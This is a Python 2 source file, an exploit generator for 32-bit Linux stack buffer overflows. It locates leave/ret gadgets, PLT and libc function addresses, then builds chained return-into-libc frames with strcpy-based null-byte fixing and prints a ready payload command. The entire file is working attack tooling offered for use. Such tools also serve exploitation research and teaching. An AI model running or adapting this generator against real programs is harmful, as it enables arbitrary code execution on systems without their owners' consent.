#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Copyright © 2010 Eric Bourry

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import sys
import os

# TODO: Should read the instructions from stdin, not from a file
# TODO: The destination of the fixing strcpy() calls might contain a null byte. They should be recursively patched.

OBJDUMP = "objdump"      # objdump binary ; could sometimes be gobjdump
LDD = "ldd"                       # ldd binary
CODE = "code"                  # code file containing the shellcode instructions 
LIBC = "libc.so"                  # partial name of the libc file


class ArgType:
    String = 1
    Integer = 2


def debug(str):
    print >> sys.stderr, "\t", str


def good(str):
    print >> sys.stderr, "[+]", str


def alert(str):
    print >> sys.stderr, "[-]", str


def error(str):
    alert(str)
    sys.exit(1)
	
	
def formatDWORD(val):
    return "\\x%02x\\x%02x\\x%02x\\x%02x" % ( (val)%256, (val>>8)%256, (val>>16)%256, (val>>24)%256 )
	

def formatString(str):
    res = ""
    for c in str:
        res += "\\x%02x" % ord(c)
    return res
	

# Prints how to use the program and exits
def usage():
    print "Usage"
    sys.exit(2)


# Uses objdump to find the address of a "leave/ret" sequence
def findLeaveRet(target):
    cmd = OBJDUMP + " -d -j .text " + target
    out = os.popen(cmd, 'r')
    leaveFound = False
    addr = 0
    for line in out.readlines():
        words = line.split()
        if len(words) == 0:
            continue
        if leaveFound and words[len(words)-1]=="ret":
            out.close()
            return addr
        elif words[len(words)-1]=="leave": 
            leaveFound = True
            addr = int(words[0][:len(words[0])-1], 16)
        else:
            leaveFound = False
    out.close()
    return 0
	

# Uses objdump to find the list of the PLT functions
def listPLTFromDis(target):
    cmd = OBJDUMP + " -d -j .plt " + target + " | grep @plt"
    out = os.popen(cmd, 'r')
    plt = {}
    for line in out.readlines():
        words = line.split()
        try:
            addr = int(words[0], 16)
        except:
            continue
        words = words[1].strip("<>:\n").split('@')
        if len(words)==2 and words[1]=="plt":
            plt[words[0]] = addr
    out.close()
    return plt


# Uses objdump to find the PLT address
def findPLT(target):
    cmd = OBJDUMP + " -h " + target + " | grep ' .plt'"
    out = os.popen(cmd, 'r')
    info = out.read().split()
    out.close()
    try:
        begin = int(info[3], 16)
        end = begin + int(info[2], 16) - 1
        return begin, end
    except:
        return 0, 0


# Uses objdump to list the target's symbols, and returns the ones in the PLT	
def listPLTFromSymbols(target, begin, end):
    cmd = OBJDUMP + " -t " + target
    out = os.popen(cmd, 'r')
    plt = {}
    for line in out.readlines():
        words = line.split()
        try:
            addr = int(words[0], 16)
        except:
            continue
        if begin < addr <= end:
            plt[words[len(words) - 1]] = addr
    out.close()
    return plt


# Parses the code file containing the shellcode instructions
# TODO : Deal with the case where this file is not syntactically correct
def parseCode(code):
    calls = []
    for line in code.split('\n'):
        if len(line) == 0:
            continue
        splitted = line.split('(')
        func = splitted[0]
        args = splitted[1].rstrip("\n)").split(',')
        typedArgs = []
        for arg in args:
            if arg[0] == '"':
                arg = arg.strip('"')
                type = ArgType.String
            else:
                arg = arg.lower()
                type = ArgType.Integer
            typedArgs.append( (arg, type) )
        calls.append( (func, typedArgs) )
    return calls


# Uses LDD to find the location of the libc file and the address where it will be mapped in memory
def findLibcFileAndAddress(target):
    cmd = LDD + " " + target
    out = os.popen(cmd, 'r')
    addr = 0
    file = ""
    for line in out.readlines():
        if line.find(LIBC) != -1:
            words = line.split()
            straddr = words[ len(words)-1 ].strip("()")
            try:
                addr = int(straddr, 16)
            except:
                file = words[ len(words)-1 ]
                continue
            try:
                file = words[ len(words)-2 ]
            except:
                addr = 0
                continue
    out.close()
    return file, addr


# Finds the address of a libc function
def findFunctionAddress(func, libcFile, libcAddr):
    cmd = OBJDUMP + " -T " + libcFile + " | grep " + func
    out = os.popen(cmd, 'r')
    for line in out.readlines():
        words = line.split()
        if words[ len(words)-1 ] == func:
            try:
                offset = int(words[0], 16)
            except:
                continue
            out.close()
            return libcAddr + offset
    out.close()
    return 0


# Finds the addresses of the functions in the set "calls", first in the PLT, then in the libc
def findFunctionAddresses(calls, libcFile, libcAddr, plt):
    funcAddr = {}
    for func, args in calls:
        if not func in funcAddr:
            if func in plt:
                funcAddr[func] = plt[func]
            else:
                addr = findFunctionAddress(func, libcFile, libcAddr)
                if addr == 0:
                    return {}
                funcAddr[func] = addr
    return funcAddr


# Builds a frame whose starting address is "base", and that calls the function at the address "call", with the args "args"
def makeFrame(args, call, lret, base):
    ret = formatDWORD(lret)
    func = formatDWORD(call)
    argcode = ""
    stringcode = ""
    baseStrings = base+4*(3 + len(args))	# 3 for nextEBP, callAddr, savedEIP
    for arg, type in args:
        if type == ArgType.Integer:
            argcode += formatDWORD(int(arg,16))
        elif type == ArgType.String:
            argcode += formatDWORD(baseStrings + len(stringcode)/4)
            stringcode += formatString(arg)
            stringcode += "\\x00"
    nextEBP = formatDWORD(baseStrings + len(stringcode)/4)
    return nextEBP + func + ret + argcode + stringcode


# Builds a set of frames. "funcAddr" contains the addresses of the necessary functions. "bufaddr" is the base address of the frames stack.
def makeFrames(calls, funcAddr, lret, bufaddr):
    frames = []
    base = bufaddr
    for call in calls:
        frame = makeFrame(call[1], funcAddr[call[0]], lret, base)
        frames.append(frame)
        base += len(frame)/4
    return frames


# Uses objdump to find a null byte in the target binary
def findNullbyte(target):
    cmd = OBJDUMP + " -d -j .text " + target + " | grep 00"
    out = os.popen(cmd, 'r')
    for line in out.readlines():
        words = line.split()
        try:
            base = int(words[0][:len(words[0])-1], 16)
        except:
            continue
        for index in range(len(words)):
            if words[index] == "00":
                return base+index-1
    return 0


# Replaces the null bytes and builds the fixing instructions
def makeFixCode(shellcode, base, nullbyte):
    zero = "\\x00"
    fixes = ""
    for index in range(0, len(shellcode), 4):
        if shellcode[index:index+4] == zero:
            fixes += "strcpy(0x%x,0x%x)\n" % (base + index/4, nullbyte)
    return fixes, shellcode.replace("00", "cc")


# Sets the last saved EBP of the fixing frames to the beginning of the exploitation frames
def changeLastFrameEBP(fixFrames, bufaddr):
    lastFrame = fixFrames[-1]
    fixFrames[-1] = formatDWORD(bufaddr)+lastFrame[4*4:]


# Prints the shellcode
def printExploit(begin, length, end):
    print "python -c \"print '%s' + '\\x90'*0x%x + '%s'\"" % (begin, length-(len(begin)/4), end)


# Main function
def main():
    try:
        target = sys.argv[1]
        bufaddr = int(sys.argv[2], 16)
        bufsize = int(sys.argv[3], 16) 
        if len(sys.argv) > 4:
            defaultLibc = int(sys.argv[4], 16)
    except:
        usage()

    lret = findLeaveRet(target)
    if lret != 0:
        good("Leave/Ret found: 0x%08x" % (lret))
    else:
        error("Leave/Ret not found")

    plt = listPLTFromDis(target)
    if len(plt) != 0:
        good("List of the PLT functions with adresses:")
        for func in plt:
            debug("%-30s0x%08x" % (func, plt[func]))
    else:
        alert("No PLT info in the disassembly, trying with the symbols")

        pltBegin, pltEnd = findPLT(target)
        if pltBegin != 0:
            good("PLT address range: 0x%08x - 0x%08x" % (pltBegin, pltEnd))
        else:
            error("Couldn't find the PLT")
                
        plt = listPLTFromSymbols(target, pltBegin, pltEnd)
        if len(plt) != 0:
            good("List of the PLT functions with adresses:")
            for func in plt:
                debug("%-30s0x%08x" % (func, plt[func]))
        else:
            error("Couldn't list the PLT")

    try:
        code = open(CODE, 'r')
        content = code.read()
    except:
        error("Couldn't read the file containing the shellcode instructions: "+CODE)
    calls = parseCode(content)
    if len(calls) != 0:
        good("Parsing of the shellcode instructions:")
        for call in calls:
            debug(call)
    else:
        error("Couldn't parse the shellcode instructions")
    code.close()
        
    libcFile, libcAddr = findLibcFileAndAddress(target)
    if len(libcFile) != 0:
        good("Libc file found: %s" % libcFile)
    else:
        error("Couldn't find the libc file")
    if libcAddr != 0:
        good("Libc address found: 0x%08x" % libcAddr)
    else:
        libcAddr = defaultLibc
        alert("Couldn't find the libc address, using argument:  0x%08x" % libcAddr)
        
    funcAddr = findFunctionAddresses(calls, libcFile, libcAddr, plt)
    if len(funcAddr) != 0:
        good("List of the shellcode functions with addresses:")
        for func in funcAddr:
            debug("%-30s0x%08x" % (func, funcAddr[func]))
    else:
        error("Couldn't find the addresses of the shellcode functions")
    for func in plt:
        funcAddr[func] = plt[func]
        
    frames = makeFrames(calls, funcAddr, lret, bufaddr)
    shellcode = ""
    if len(frames) != 0:
        good("Basic shellcode frames, might contain null bytes:")
        for frame in frames:
            debug(frame)
            shellcode += frame
    else:
        error("Could not build the basic shellcode frames")
    fixBase = bufaddr + len(shellcode)/4

    nullbyte = findNullbyte(target)
    if nullbyte != 0:
        good("Null-byte address: 0x%08x" % nullbyte)
    else:
        error("Couldn't find a null-byte")
        
    if not "strcpy" in plt:
        error("Couldn't find strcpy in the PLT")
        
    fixCode, shellcode = makeFixCode(shellcode, bufaddr, nullbyte)
    if len(fixCode) != 0:
        good("Null-byte fixing instructions:")
        for line in fixCode.split('\n'):
            debug(line)
    else:
        alert("Nothing to fix in the shellcode")
        
    fixCalls = parseCode(fixCode)
    if len(fixCalls) != 0:
        good("Parsing of the fixing instructions:")
        for call in fixCalls:
            debug(call)
    else:
        error("Couldn't parse the fixing instructions")
        
    fixFrames = makeFrames(fixCalls, funcAddr, lret, fixBase)
    changeLastFrameEBP(fixFrames, bufaddr)
    fix = ""
    if len(fixFrames) != 0:
        good("Fixing frames, without null bytes:")
        for frame in fixFrames:
            debug(frame)
            fix += frame
    else:
        error("Could not build the fixing frames")
        
    end = formatDWORD(fixBase) + formatDWORD(lret)	
    printExploit(shellcode+fix, bufsize, end)
    

if __name__ == '__main__':
    main()
